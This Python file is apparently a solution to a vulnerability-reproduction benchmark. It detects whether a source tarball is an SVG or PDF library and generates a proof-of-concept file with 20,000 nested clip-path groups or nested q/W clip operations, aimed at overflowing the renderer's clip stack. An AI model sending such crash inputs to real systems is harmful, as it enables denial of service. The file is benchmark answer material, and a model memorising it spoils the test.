import os
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = self._detect_format(src_path)
        if fmt == "pdf":
            return self._make_pdf_poc()
        else:
            # Default to SVG PoC; this is the expected format for the targeted bug.
            return self._make_svg_poc()

    def _detect_format(self, src_path: str) -> str:
        # Best-effort heuristic to distinguish between SVG- and PDF-related projects.
        try:
            with tarfile.open(src_path, "r:*") as tf:
                names = [m.name.lower() for m in tf.getmembers()]
        except Exception:
            return "svg"

        joined = "\n".join(names)

        # Strong SVG / librsvg hints
        if "librsvg" in joined or "/svg" in joined or "rsvg" in joined:
            return "svg"

        # Strong PDF library hints
        pdf_hints = (
            "pdfium",
            "poppler",
            "mupdf",
            "qpdf",
            "/pdf",
            "pdf-",
            "pdf_",
            "pdf/",
        )
        for h in pdf_hints:
            if h in joined:
                return "pdf"

        # Fallback: look at filenames for obvious hints
        for name in names:
            base = os.path.basename(name)
            if "svg" in base:
                return "svg"
            if "pdf" in base:
                return "pdf"

        # Default assumption: SVG
        return "svg"

    def _make_svg_poc(self) -> bytes:
        # Construct an SVG with very deep nesting of groups that each apply a clip-path,
        # which stresses the layer/clip stack.
        header = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n'
            '<defs>\n'
            '<clipPath id="c">\n'
            '<rect x="0" y="0" width="100" height="100"/>\n'
            '</clipPath>\n'
            '</defs>\n'
        )

        # Each <g> both applies a clip-path and an opacity to force layer usage.
        open_tag = '<g clip-path="url(#c)" opacity="0.5">'
        close_tag = '</g>'

        # Choose depth such that total size is around the ground-truth PoC size.
        depth = 20000

        inner = '<rect x="10" y="10" width="10" height="10"/>\n'
        footer = '\n</svg>\n'

        svg_str = header + (open_tag * depth) + inner + (close_tag * depth) + footer
        return svg_str.encode("ascii")

    def _make_pdf_poc(self) -> bytes:
        # Construct a minimal but valid PDF with a very deep graphics-state / clip stack.
        # This targets libraries that maintain a clip stack per 'q' / 'Q' and 'W' ops.
        # The structure is:
        #   1 0 obj: Catalog
        #   2 0 obj: Pages
        #   3 0 obj: Page
        #   4 0 obj: Contents (stream with many q/W/Q operations)
        content_depth = 20000

        # Build the content stream: many nested q ... W n, then many Q to unwind.
        # Each 'q' saves state; '0 0 100 100 re W n' sets a new clipping rectangle.
        lines = []
        clip_cmd = "q 0 0 100 100 re W n\n"
        for _ in range(content_depth):
            lines.append(clip_cmd)
        for _ in range(content_depth):
            lines.append("Q\n")
        content_bytes = "".join(lines).encode("ascii")

        parts = []
        offsets = [0]  # index 0 is the free object; real objects start at 1
        offset = 0

        def add(data: bytes):
            nonlocal offset
            parts.append(data)
            offset += len(data)

        # PDF header
        header = b"%PDF-1.4\n%\xFF\xFF\xFF\xFF\n"
        add(header)

        # 1 0 obj: Catalog
        offsets.append(offset)
        add(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")

        # 2 0 obj: Pages
        offsets.append(offset)
        add(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")

        # 3 0 obj: Page
        offsets.append(offset)
        add(
            b"3 0 obj\n"
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\n"
            b"endobj\n"
        )

        # 4 0 obj: Contents
        offsets.append(offset)
        length_str = str(len(content_bytes)).encode("ascii")
        add(b"4 0 obj\n<< /Length " + length_str + b" >>\nstream\n")
        add(content_bytes)
        add(b"endstream\nendobj\n")

        # xref table
        xref_offset = offset
        xref_lines = []
        xref_lines.append(b"xref\n0 5\n")
        # Object 0: free
        xref_lines.append(b"0000000000 65535 f \n")
        # Objects 1..4
        for obj_num in range(1, 5):
            obj_off = offsets[obj_num]
            xref_lines.append(f"{obj_off:010d} 00000 n \n".encode("ascii"))
        xref_bytes = b"".join(xref_lines)
        add(xref_bytes)

        # trailer
        trailer = (
            b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n"
            + str(xref_offset).encode("ascii")
            + b"\n%%EOF\n"
        )
        add(trailer)

        return b"".join(parts)
